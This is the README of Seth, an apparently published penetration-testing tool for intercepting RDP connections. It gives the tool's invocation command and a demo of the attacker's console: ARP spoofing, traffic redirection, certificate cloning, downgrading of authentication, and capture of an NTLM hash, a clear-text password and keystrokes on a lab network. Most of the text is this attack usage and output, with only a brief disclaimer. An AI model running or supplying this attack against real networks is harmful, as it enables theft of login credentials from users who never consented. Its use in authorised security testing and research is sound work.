Seth
====

Seth is a tool written in Python and Bash to MitM RDP connections. It
attempts to downgrade the connection and extract clear text credentials.

Usage
-----

Run it like this:

    $ ./seth.sh <INTERFACE> <ATTACKER IP> <VICTIM IP> <GATEWAY IP>

For more information, read the PDF in `doc/paper`, run
`./rdp-cred-sniffer.py -h` or read the code.


Demo
----

The following ouput shows the attacker's view. Seth sniffs an offline
crackable hash as well as the clear text password. Here, NLA is not enforced
and the victim ignored the certificate warning. The client is Windows 7 and
the Server Windows 10.

    # ./seth.sh eth1 192.168.57.{103,2,102}
    ███████╗███████╗████████╗██╗  ██╗
    ██╔════╝██╔════╝╚══██╔══╝██║  ██║   by Adrian Vollmer
    ███████╗█████╗     ██║   ███████║   seth@vollmer.syss.de
    ╚════██║██╔══╝     ██║   ██╔══██║   SySS GmbH, 2017
    ███████║███████╗   ██║   ██║  ██║   https://www.syss.com
    ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
    [*] Spoofing arp replies...
    [*] Turning on IP forwarding...
    [*] Set iptables rules for SYN packets...
    [*] Waiting for a SYN packet to the original destination...
    [+] Got it! Original destination is 192.168.57.102
    [*] Clone the x509 certificate of the original destination...
    [*] Adjust the iptables rule for all packets...
    [*] Run RDP proxy...
    Connection received from 192.168.57.2
    Downgrading authentication options from 11 to 3
    Enable SSL
    alice::avollmer-syss:1f20645749b0dfd5:b0d3d5f1642c05764ca28450f89d38db:0101000000000000b2720f48f5ded2012692fcdbf5c79a690000000002001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0001001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0004001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0003001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0007000800b2720f48f5ded20106000400020000000800300030000000000000000100000000200000413a2721a0d955c51a52d647289621706d6980bf83a5474c10d3ac02acb0105c0a0010000000000000000000000000000000000009002c005400450052004d005300520056002f003100390032002e003100360038002e00350037002e00310030003200000000000000000000000000
    Tamper with NTLM response
    TLS alert access denied, Downgrading CredSSP
    Waiting for connection
    Connection received from 192.168.57.2
    Enable SSL
    Connection lost
    Waiting for connection
    Connection received from 192.168.57.2
    Enable SSL
    Hiding forged protocol request from client
    .\alice:ilovebob
    Keyboard layout/type/subtype: 0x20409/0x7/0x0
    Key release:                 Tab
    ^C[*] Cleaning up...
    [*] Done.


Disclaimer
----------

Use at your own risk. Do not use without full consent of everyone involved.
For educational purposes only.
